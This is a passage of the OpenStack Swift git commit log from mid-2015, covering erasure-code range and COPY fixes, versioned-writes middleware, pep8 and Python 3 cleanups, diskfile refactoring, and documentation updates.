    When range GET (or COPY) for an EC object requested, if the requested range
    starts from more than last segments alignment (i.e.
    ceil(object_size/segment_size) * segment_size), proxy server will return
    the original content length w/o body, though Swift should return an error
    massage as a body and the length of message as the content length.
    The current behavior will cause stuck on some client. (e.g. curl)
    
    This patch fixes that proxy enables to return correct response, even if such
    an over range requested.
    
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    
    Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
    Closes-Bug: #1475499

commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Tue Aug 11 10:17:20 2015 -0500

    Fix 500 in versioned writes with bad Destination
    
    When this code lived in the proxy, it was protected by an "except
    HTTPException" clause in proxy.Application.handle_request(). When it
    moved to middleware, it lost that, and then things like
    constraints.check_name_format that raised HTTPException would cause
    500s. The HTTPException would make it all the way out to catch_errors
    and get translated to a 500.
    
    This commit just wraps a couple try/excepts around the bits in
    versioned writes that can raise HTTPException. I tried to make it use
    wsgify so I could get that for free, but that wound up being a real
    pain because env/start_response are plumbed through pretty much the
    whole versioned-writes middleware.
    
    Closes-Bug: 1483705
    
    Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25

commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva &lt;thiago@redhat.com&gt;
Date:   Sun Nov 9 13:13:27 2014 -0500

    versioned writes middleware
    
    Rewrite object versioning as middleware to simplify the PUT method
    in the object controller.
    
    The functionality remains basically the
    same with the only major difference being the ability to now
    version slo manifest files. dlo manifests are still not
    supported as part of this patch.
    
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    
    DocImpact
    Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
    Signed-off-by: Thiago da Silva &lt;thiago@redhat.com&gt;
    Signed-off-by: Prashanth Pai &lt;ppai@redhat.com&gt;

commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Tue Jul 28 10:31:54 2015 +0100

    Replace assertTrue(not &lt;condition&gt;) with assertFalse(&lt;condition&gt;)
    
    The replacement of assert_ with assertTrue [1] resulted in a number of
    tests using calls of the form assertTrue(not &lt;condition&gt;). This patch
    replaces those with assertFalse(&lt;condition&gt;).
    
    [1] change I74705c6498249337bfdf955d62e0ad972035bc1f
    
    Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1

commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;
Date:   Fri Aug 7 22:07:01 2015 +0800

    Fix some spelling typo in comments
    
    s/overide/override for object-expirer.conf and sample.
    s/automaticaly/automatically for swift/proxy/controllers/obj.py
    
    Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
    Signed-off-by: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;

commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Thu Aug 6 00:55:36 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3,changes in
    dir:
    *test/unit/obj/*
    *test/unit/test_locale/*
    
    Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b

commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;
Date:   Fri Aug 7 21:57:08 2015 +0800

    Fix a spelling typo in comment
    
    s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
    
    Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
    Signed-off-by: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;

commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Thu Aug 6 10:01:17 2015 -0500

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in the following dir:
    test/unit/proxy/*
    
    Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6

commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Thu Aug 6 09:28:51 2015 -0500

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in the following dir:
    test/probe/*
    
    Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5

commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Wed Aug 5 14:51:32 2015 -0500

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in the following dir:
    test/functional/*
    
    Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405

commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda &lt;matsuda_kenichi@jp.fujitsu.com&gt;
Date:   Thu Aug 6 10:13:02 2015 +0900

    Fix shebang of commands
    
    Fix shebang of following commands.
      $ grep '#!/usr/bin/python' swift/bin/*
      swift/bin/swift-account-info:#!/usr/bin/python
      swift/bin/swift-container-info:#!/usr/bin/python
      swift/bin/swift-container-sync:#!/usr/bin/python
      swift/bin/swift-recon:#!/usr/bin/python
      swift/bin/swift-ring-builder:#!/usr/bin/python
      swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
    
    Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
    Closes-Bug: #1481623

commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev &lt;zaitcev@kotori.zaitcev.us&gt;
Date:   Wed Aug 5 15:33:29 2015 -0600

    Having said H, I, J, we ought to say K
    
    In the long run, we might want to stop these updates. But this
    decision is above my pay grade.
    
    Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b

commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Thu Aug 6 00:18:52 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in
    dir: test/unit/container/*
    
    Change-Id: I3333022ed63ce03198bc73147246d91d2442a440

commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Wed Aug 5 22:32:02 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3, fixing in:
    dir: test/unit/cli/*
    
    Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318

commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Wed Aug 5 22:25:46 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in
    dir : test/unit/account/*
    
    Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7

commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin &lt;blmartin@us.ibm.com&gt;
Date:   Mon Jul 27 14:19:09 2015 -0500

    +Document method to avoid rsync filling root drive
    
    When rsync pushes to a remote node with an unmounted drive and if
    certain steps are not taken, rsync may attempt to write files to
    the local drive at the location where the drive was mounted.
    
    There are two suggested solutions for this issue:
      1) Set the permissions for all mount points in /srv/node/
           to root:root 755
      2) Mount the drives elsewhere and symlink the drives to /srv/.../
    
    The first method ensures that only root and not the swift user
    can write in the /srv/.../ directories.
    
    The second method will prompt a broken link issue if rsync
    attempts to write to an unmounted drive.
    
    Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
    Closes-Bug: #1470576

commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu &lt;charles0126@gmail.com&gt;
Date:   Wed Aug 5 22:09:40 2015 +0800

    Add extra_header_count to document and config.
    
    Change-Id: Iec86b488d71553c295afe7098822ce2046df9546

commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Tue Aug 4 23:15:37 2015 -0700

    Fix TypeError if backend response doesn't have expected headers
    
    There was some debug logging mixed in with some error handling on PUTs
    that was relying on a very specific edge would only encounter a set of
    backend responses that included the expected set of headers to diagnoise
    the failure.
    
    But the backend responses may not always have the expected headers.
    
    The proxy debug logging should be more robust to missing headers.
    
    It's a little hard to follow, but if you look `_connect_put_node` in
    swift.proxy.controller.obj - you'll see that only a few connections can
    make their way out of the initial put connection handling with a "resp"
    attribute that is not None.  In the happy path (e.g. 100-Continue) it's
    explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
    connection will be established to the next node in the node iter.
    
    Some status code will however allow a conn to be returned for validation
    in `_check_failure_put_connections`, i.e.
    
      * 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
      * 409 - Conflict with another timestamp
      * 412 - If-None-Match that encounters another object
    
    ... so I added tests for those - fixing a TypeError along the way.
    
    Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2

commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz &lt;dpgoetz@gmail.com&gt;
Date:   Fri Jun 26 17:27:31 2015 -0700

    Speed up reaper for a big account delete and some better error handling
    
    In run_forever mode, run the reaper on all three copies of the account
    DB instead of just the first one and shard the containers between them.
    
    Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765

commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot &lt;openstack-infra@lists.openstack.org&gt;
Date:   Tue Aug 4 06:29:11 2015 +0000

    Imported Translations from Transifex
    
    For more information about this automatic import see:
    https://wiki.openstack.org/wiki/Translations/Infrastructure
    
    Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93

commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME &lt;natsume.takashi@lab.ntt.co.jp&gt;
Date:   Tue Aug 4 10:14:25 2015 +0900

    Fix typo of 'receive'
    
    Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c

commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz &lt;brian.reitz@oracle.com&gt;
Date:   Mon Aug 3 16:28:31 2015 -0500

    Convert docstring to a comment in test_denied_DELETE_of_versioned_object unit test.
    
    Docstrings cause issues for nose and created non standard test output for this test.
    
    Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86

commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Mon Aug 3 14:58:24 2015 +0100

    Test that get_hashes ignores only removed hash dir
    
    Add test for case not yet covered by unit tests: suffix dir
    has two hash dirs, one with expired tombstone. That hash dir gets
    removed and its hash is not included in the suffix hash, but the
    remaining hash dir's hash is reported.
    
    Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3

commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Mon Jul 20 13:06:48 2015 -0700

    Handle removed suffix dirs the same as empty suffix dirs
    
    When hashes suffix dirs, the directory might have gotten cleaned up while
    still appearing in hashes.pkl.  It would even get cleaned up the next time.
    
    For example, given this really old tombstone:
    
        objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
    
    Prior to this commit, a call to get_hashes() would reap the old
    tombstone and any empty containing dirs, but the resulting hashes.pkl
    would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
    though there's no such suffix dir any more.
    ("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
    
    Then, a *subsequent* get_hashes() call would omit 3d0 from the resulting
    hash, so then hashes.pkl would no longer contain 3d0. This difference
    would result in a little useless replication traffic while nodes without
    a particular part/suffix pair, but who disagreed on how that showed up
    in hashes.pkl, tried to push their version of nothing to one another.
    
    Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
    it's for replication or EC, or whether it's for the get_hashes() call
    that reaped the suffix dirs or not.
    
    Co-Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
    
    Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f

commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Fri Jun 5 13:06:29 2015 +0100

    Make test_proxy work independent of env vars
    
    test.unit.common.test_internal_client.TestSimpleClient.test_proxy
    will fail if the environment has http_proxy set and does not have
    no_proxy=127.0.0.1 set. This seems to be because urllib overrides
    any proxy arg passed to the Request with the env http_proxy var,
    unless the Request host is in no_proxy.
    
    We don't need to test urllib, so this patch changes the test to
    simply ensure that swift code does pass the correct proxy arg to
    urllib2.urlopen. That avoids testers having to make sure their
    env vars are compliant to successfully run unit tests. While it is
    reasonable to think that 127.0.0.1 is in the no_proxy list, it
    shouldn't be a requirement pass swift tests.
    
    Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817

commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sat Jun 27 23:26:47 2015 +0530

    Adding bandit for security static analysis testing in swift
    
    This change adds a basic bandit config for Swift. It can be invoked
    by running the tox environment for bandit;
        tox -e bandit
    
    This is an initial step for using bandit with Swift
    and it should be revisited to improve the testing as more is learned
    about the specific needs of the Swift code base.As per now some tests
    are excluded as they were used on purpose.
    
    https://wiki.openstack.org/wiki/Security/Projects/Bandit
    
    Implements: blueprint swift-bandit
    
    Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2

commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 30 15:30:35 2015 -0700

    Add a probetest for HUP/reload
    
    This would have been enough to catch the regression, and we can extend
    them as we work on any future ehancements to our process management.
    
    Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace

commit 207dd9b49d7d53a9faa4849af2c40bb875416fce
Author: Darrell Bishop &lt;darrell@swiftstack.com&gt;
Date:   Thu Jul 30 14:32:08 2015 -0700

    Fix regression in WSGI server SIGHUP behavior
    
    The SIGHUP receipt used to pop us out of an os.wait() where now, it's in
    a "green" wait() and Timeout() combo, some part of which eats the signal
    receipt.  This causes the while loop condition to never get checked and
    SIGHUP no longer works as a server reload command.
    
    The fix is to loop at least every 0.5 seconds, as a trade-off between
    not busy-waiting and checking the "keep running" condition often enough
    to feel responsive.
    
    Change-Id: I95283b8b7cfc2998ab5813e0ad3ca1fa231696c8
    Closes-Bug: #1479972

commit bcd00d9461603db1477c5f1e9f8dd6405a319eb9
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Mon Jun 8 19:40:56 2015 +0100

    Refactor diskfile
    
    This patch mostly eliminates the duplicate code that was
    deliberately left in place during EC review to avoid major
    churn of the diskfile module prior to the kilo release.
    
    This focuses on obvious de-duplication and shuffling code
    between classes. It deliberately does not attempt to
    hammer out every last piece of de-duplication where that
    would introduce more complex changes - that can come later.
    
    Code is moved from the module level and from ECDiskFile*
    classes into new BaseDiskFile* classes.
    
    Concrete classes for replication and EC policy retain their
    existing names i.e. DiskFile[Manager|Writer|Reader|] and
    ECDiskFile[Manager|Writer|Reader|] respectively.
    
    Knock-on changes:
    
    - fix bug whereby get_hashes was ignoring self.reclaim_age
      and always using the default arg value.
    
    - replication diskfile manager now deletes a tombstone that is older
      than reclaim_age even when there is a newer .meta file.
    
    - replication diskfile manager will no longer raise an
      AssertionError if only a .meta file is found during
      hash_cleanup_listdir.
    
    - fix stale test in test_auditor.py: test_with_tombstone test
      setup was convoluted (probably dates back to when object puts
      did not clean up the object dir). Now that they do you have to
      try harder to create a dir with a tombstone and a data file.
    
    Change-Id: I963e0d0ae0d6569ad1de605034c529529cbb4f9a

commit 9cb7eb4a4b6cdab8a5f16b3dc800b39ab4068522
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Mon Jul 27 11:34:07 2015 +0200

    Update hacking to 0.10.0
    
    Replace the whitelist of flake8 checks (select) with a blacklist
    (ignore).  It makes possible to disable a single check, which was not
    possible before. This new approach permits to enable new tests more
    easily and see which checks are currently disabled.
    
    Only new checks are disabled, this change doesn't run less checks than
    before. Currently, many checks are disabled, but following changes will
    fix these new warnings.
    
    When the "select" option of flake8 is used in tox.ini, the "ignore"
    option is ignored. It is not possible to use "select" and "ignore"
    options at the same time. See the code in pep8 (flake8 is based on
    pep8):
    
    https://github.com/PyCQA/pep8/blob/d48eef071003952ed0f98445dc3dc6bc29618f9c/pep8.py#L1808
    
    The purpose of flake8 is to enhance the coding style, but also to help
    to detect common bugs. Blacklisting checks permits to detect new bugs
    when upgrading the tools. For example, new checks were recently added to
    help porting code to Python 3.
    
    This change permits to use pbr 1.0 and newer which is required to
    support Python 3. Previously, hacking 0.8.1 was used, but hacking 0.8 is
    incompatible with pbr 1.0 and newer (hacking 0.8 requires pbr&lt;1.0).
    
    pbr 1.0 is required to use environment markers on requirements to
    install dnspython on Python 2 and dnspython3 on Python 3.
    
    Change-Id: I41d63b9467083d7606ad18aaa398ca7738b27fae

commit 389a97e3526df68121cecfaf1909343b5d381cbc
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Wed Jul 29 23:46:58 2015 +0200

    Fix pep8 E warning for hacking 0.10
    
    Fix pep8 warnings of the E category of hacking 0.10:
    
    * E113: unexpected indentation
    * E121: continuation line under-indented for hanging indent
    * E122: continuation line missing indentation or outdented
    * E123: closing bracket does not match indentation of opening bracket's
      line
    * E126: continuation line over-indented for hanging indent
    * E251: unexpected spaces around keyword / parameter equals
    
    Change-Id: I0b24eebdf1a37dc1b572b6c9a3d3d4832d050237

commit d719064e788ec5fa70305fadaa46affcb603a9bb
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Thu Jul 30 00:28:44 2015 +0200

    Fix warning pep8 E128 warning of hacking 0.10
    
    Fix the warning E128: "continuation line under-indented for visual
    indent" of pep8.
    
    Change-Id: Ie6c6ae341fe3d6281f2095c1d756d552fa5937f9

commit a0db56dcde83096708e6fe64ae9338098e0ba98a
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Thu Jul 30 00:16:06 2015 +0200

    Fix pep8 E265 warning of hacking 0.10
    
    Fix the warning E265 "block comment should start with '# '" added in pep
    1.5.
    
    Change-Id: Ib57282e958be9c7cddffc7bca34fbbf1d4c460fd

commit 345785837f1caa01fec5bca091c70481d7069bea
Author: Charles Hsu &lt;charles0126@gmail.com&gt;
Date:   Thu Jul 30 13:11:00 2015 +0800

    Remove error_suppression_interval, error_suppression_limit options.
    
    These two options is belong to proxy-server, not account-replicator.
    
    Change-Id: Ie030ecffd213e56db32df77c69b847479d96308f

commit 5a7383313b1c555df5fd47050f7ee3810b5e31fc
Author: Carlos Cavanna &lt;ccavanna@ca.ibm.com&gt;
Date:   Tue Jul 28 19:15:25 2015 -0400

    Swift documentation for first-time contributors.
    
    In this change, there are proposed improvement to Swift documentation aimed at
    first-time contributors. They include a simplification of the Getting
    Started page and a new page with some basic instructions/commands that the
    first-time contributor should know. In addition, it shows some common errors
    that the first-time contributor may find when executing git rebase and
    information on how to track your changes.
    
    Change-Id: I704202955093736b2f3b4102a649690a0392c6b0

commit 5b5c8820024141bc6ae49d7646a92fb53667ea9b
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Wed Jul 29 12:36:35 2015 +0100

    Remove unused code in swift/obj/server.py
    
    keep_cache was defined twice
    
    Change-Id: I5f775f618669e3dabfc3bc54dd7bd2cd7f00b2f0

commit 0c27cb07caf1027cd9734e8bd34d9759da33e667
Author: OpenStack Proposal Bot &lt;openstack-infra@lists.openstack.org&gt;
Date:   Wed Jul 29 06:36:01 2015 +0000

    Imported Translations from Transifex
    
    For more information about this automatic import see:
    https://wiki.openstack.org/wiki/Translations/Infrastructure
    
    Change-Id: Ic30cb1dc8f12280a52cc1f07a1cf516397ed680e

commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 28 21:03:05 2015 +0530

    test/unit: Replace python print operator with print function (pep H233, py33)
    
    'print' function is compatible with 2.x and 3.x python versions
    Link : https://www.python.org/dev/peps/pep-3105/
    
    Python 2.6 has a __future__ import that removes print as language syntax,
    letting you use the functional form instead
    
    Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af

commit 117b61976fbf14d8a0d2157256f9a3230421ee72
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Wed Jul 22 15:40:55 2015 -0700

    functests: use assertIn and assertNotIn
    
    We have a bunch of assertions like
    
        self.assertTrue(resp.status in (200, 204))
    
    Sometimes we get smart about failure messages and have something like
    
        self.assertTrue(resp.status in (200, 204), resp.status)
    
    so we can see what the status was when it failed.
    
    Since we don't have to support Python 2.6 any more, we can use
    assertIn/assertNotIn and get nice failure messages for free.
    
    Change-Id: I2d46c9969d41207a89e01017b4c2bc533c3d744f

commit 8fe8bee7e0c5c9d34d7a8e6ab090c8d65c5ca78e
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 21 18:06:32 2015 +0530

    test/(functional, probe): Replace "self.assert_" by "self.assertTrue"
    
    The assert_() method is deprecated and can be safely replaced by assertTrue().
    This patch makes sure that running the tests does not generate warnings
    all over the screen.
    
    Change-Id: I74705c6498249337bfdf955d62e0ad972035bc1f

commit 4a6e0ccc69302a5384b988149e294656323d7f20
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Mon Jul 20 11:58:35 2015 -0700

    Rename WsgiStringIO -&gt; WsgiBytesIO.
    
    If we're going to have a subclass of BytesIO, having "StringIO" in its
    name is just asking for confusion.
    
    Change-Id: I695ab3105b1a02eb158dcf0399ae91888bc1c0ac

commit 5ee742c17d9ea92ca7332cb67db0cce64b7a0d8f
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Fri Jul 24 21:19:47 2015 +0530

    Modifying Lambda function tuple usage for python3
    
    Current tuple unpacking is not supported in python3
    
    Change-Id: I15a8e977684d19154cf2233caf1174f6983ac9e2

commit 6f89f71f9ba11f7b4126b80076a0f13792332e1e
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Wed Apr 15 16:17:23 2015 +0100

    Filter Etag key from ssync replication-headers
    
    ssync rx sends a header X-Backend-Replication-Headers whose value is a
    list of headers that the source object has. This list extends the list
    of allowed headers on the target object server, so that the target
    object metadata is faithfully reconstructed to match the source.
    
    Unfortunately the combination of lower() and title() operations on
    header keys results in the source 'ETag' value being added to the target
    metadata under the key 'Etag' in addition to the 'ETag' key that the
    receiving server adds (note different capitilization), both having
    the same value.
    
    The spurious 'Etag' metadata is potentially confusing for humans
    inspecting the object metadata and complicates tests that wish to
    assert the equality of two object metadata dicts. See for example the
    test in test_ssync_sender.py that this patch cleans up.
    
    Furthermore, the possibility of having both Etag and ETag keys has
    required a workaround in the EC reconstructor [1].
    
    [1] reconstructor fix change id: Ie59ad93a67a7f439c9a84cd9cff31540f97f334a
    
    Change-Id: I0c89cf7924a4471bb6d268b5ef3884e2d2cb4286

commit e2f69138bf5fcdd84ac23be6b0bec1bb006b41f5
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 23 16:46:48 2015 -0700

    Fix string formatting in dispersion cli command
    
     ... and add a basic test that would have prevented the regression
    
    Change-Id: I4c5f643ee291dcc1397ca951450459d8b8ad0bbd

commit 83025ff38dfea3d4e3f27dc045128a7aa4ba11e4
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Fri Jul 24 11:09:10 2015 -0700

    Use right most occurrence object dir in diskfile.extract_policy
    
      I like using the rightmost one more; it's basically
      /operator-defined/mountpoint/objects/part/suffix/hash/ts.data, so I
      don't see any opportunity for other things named "objects" to creep in on the
      right of the real objects-N dir; but I could see some admin using
      /srv/object-storage/ or something
    
        -- Torgomatic The Wise
    
    Change-Id: I0a63a3e02df091a5ee2e110a345183012e357a2f

commit 363a256e58ee0f3e9f059352c2de968e3dc398e3
Author: Falk Reimann &lt;falk.reimann@sap.com&gt;
Date:   Wed Jun 24 16:54:02 2015 +0200

    Support keystone v3 domains in swift-dispersion
    
    This provides the capability to specify a project_name,
    project_domain_name and user_domain_name in /etc/swift/dispersion.conf.
    If this values are set in dispersion.conf they get populated to the
    swift-client.  With this it is possible to have a specific dispersion
    project specified, which is not the keystone default domain.  Changes
    were applied to swift-dispersion-populate and swift-dispersion-report.
    Relevant man pages, the example dispersion.conf and the admin guide were
    updated accordingly.
    
    DocImpact
    Closes-Bug: #1468374
    
    Change-Id: I0e716f8d281b4d0f510bc568bcee4a13fc480ff7

commit 3d9b2d077a157279fb6cd107a0c83727106af3ef
Author: Daisuke Morita &lt;morita.daisuke@lab.ntt.co.jp&gt;
Date:   Fri Jul 24 10:42:10 2015 +0900

    Fix swift-object-info to show policy index at deep working directory
    
    If swift-object-info command is executed at deeper working directory
    than 'objects-*' directory, it cannot parse policy index from file path
    so it does not show appropriate policy index. This patch fixes this
    problem by simply extracting the full path of a target object file.
    
    Change-Id: Idb734106a44b6121119c9b1dc8cdaaf4c6c28c31
    Closes-Bug: 1469951

commit e24d7c36fa9758618ef88ed1a8e19f4d7bb0404f
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Mon May 25 18:26:38 2015 +0200

    Use six to fix imports on Python 3
    
    Get configparser, queue, http_client modules from six.moves.
    
    Patch generated by the six_moves operation of the sixer tool:
    https://pypi.python.org/pypi/sixer
    
    Change-Id: I666241ab50101b8cc6f992dd80134ce27327bd7d

commit 964869accce8836bd2587c4b07559fb05fe580b2
Author: Atsushi SAKAI &lt;sakaia@jp.fujitsu.com&gt;
Date:   Fri Jul 24 17:09:48 2015 +0900

    Fix six typos on swift documentation
    
    mechanisim =&gt; mechanism
        http://docs.openstack.org/developer/swift/cors.html
    overridde =&gt; override
       http://docs.openstack.org/developer/swift/deployment_guide.html
    extentsions =&gt; extensions
      http://docs.openstack.org/developer/swift/development_ondisk_backends.html
    reuqest =&gt; request
      http://docs.openstack.org/developer/swift/logs.html
    suport =&gt; support
      http://docs.openstack.org/developer/swift/overview_architecture.html
    mininum =&gt; minimum
      http://docs.openstack.org/developer/swift/overview_erasure_code.html
    
    $ git diff | diffstat
     cors.rst | 2 +-
     deployment_guide.rst | 2 +-
     development_ondisk_backends.rst | 2 +-
     logs.rst | 2 +-
     overview_architecture.rst | 2 +-
     overview_erasure_code.rst | 2 +-
     6 files changed, 6 insertions(+), 6 deletions(-)
    
    Change-Id: I8e095f4c216b2cfae48dff1e17d387048349f73c
    Closes-Bug: #1477877

commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy &lt;ondrej.novy@firma.seznam.cz&gt;
Date:   Tue Jun 16 17:42:58 2015 +0200

    Time synchronization check in recon.
    
    This change add call time to recon middleware and param --time to
    recon CLI. This is usefull for checking if time in cluster is
    synchronized.
    
    Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662

commit 89f705e8aab144092d40a13fc4ef19ffef5f3eba
Author: OpenStack Proposal Bot &lt;openstack-infra@lists.openstack.org&gt;
Date:   Thu Jul 23 06:11:27 2015 +0000

    Imported Translations from Transifex
    
    For more information about this automatic import see:
    https://wiki.openstack.org/wiki/Translations/Infrastructure
    
    Change-Id: I94cf347564cb33977f33b1e64259bcb39a8cf809

commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Wed Jul 22 19:32:46 2015 -0700

    Cleanup nits from container_update_timeout
    
    Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913

commit f563a423bf2534268c2e785094d58dbbe0ebd390
Author: Hamdi Roumani &lt;roumani@ca.ibm.com&gt;
Date:   Wed Jul 22 15:27:26 2015 -0400

    Updated tox setup instructions on Development Guidelines
    
    The instructions suggest updating the ownership of the swift.egg-info
    directory may be required and provide a cmd to do so.  Said cmd assumes user
    'swift' exists, but tox will require the current user to have access to the
    directory to perform updates, moreover user swift may not exist at all.
    
    Change-Id: I63951970553c086ff4f1ac65a81559ba69166494

commit a65e9db8752793ec37b594dc9eca5066171825db
Author: Christian Schwede &lt;cschwede@redhat.com&gt;
Date:   Wed Jul 22 10:43:17 2015 +0000

    Removing commented out code in test/unit/account/test_backend.py
    
    Noticed this while reviewing another change. Looks like the test itself already
    ensures correct functionality of the reclaim() method in AccountBroker without
    the commented code, thus removing this stale code.
    
    Change-Id: I6a26a7591adef9fd794ca68a4e9c493d1127f93c

commit 99d052772a9585e0befdfd292fd03aefde77180a
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Mon Jul 13 01:12:43 2015 -0700

    Fix 499 client disconnected on COPY EC object
    
    Currently, a COPY request for an EC object might go to fail as 499 Client
    disconnected because of the difference between destination request content
    length and actual transferred bytes.
    
    That is because the conditional response status and content length for
    an EC object range GET is handled at calling the response instance on
    proxy server. Therefore the calling response instance (resp()) will change
    the conditional status from 200 (HTTP_OK) to 206 (PartialContent) and will
    change the content length for the range GET.
    
    In EC case, sometimes Swift needs whole stored contents to decode a segment.
    It will make 200 HTTP OK response from object-server and proxy-server
    will unfortunately set whole content length to the destination content
    length and it makes the bug 1467677.
    
    This patch introduces a new method "fix_conditional_response" for
    swift.common.swob.Response that calling _response_iter() and cached the
    iter in the Response instance. By calling it, Swift can set correct condtional
    response any time after setting whole content_length to the response
    instance like EC case.
    
